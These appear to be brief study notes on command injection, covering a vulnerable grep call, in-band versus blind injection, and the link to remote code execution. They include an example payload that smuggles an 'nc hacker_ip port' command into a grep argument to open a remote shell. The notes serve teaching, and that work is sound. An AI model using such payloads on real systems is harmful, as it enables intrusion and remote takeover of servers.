Some websites may use the underlying system to run commands. For instance, a website on Linux might use `grep`, `sed`, or other utilities to do things faster/easily. A **command injection** occur when a developer use the user input in commands without proper sanitization/measures.

* Vulnerable call: `grep $injectable reports/` 
* Payload: `-V; nc hacker_ip port #`
* Result: `grep -V; nc hacker_ip port #reports/` which should open a remote shell on the target.

There are two kind of command injections

* **Regular/in-band**: the user receive the result of the command
* **Blind/out-band**: the hacker must use another way to know the result.
  * Using redirections/flags, create a URL-accessible output file
  * Using commands such as `sleep`/... to do a time-based attack

> **Command-injection** is a vulnerability leading to **Remote Command Execution** (RCE) which also means Remote Code Execution.
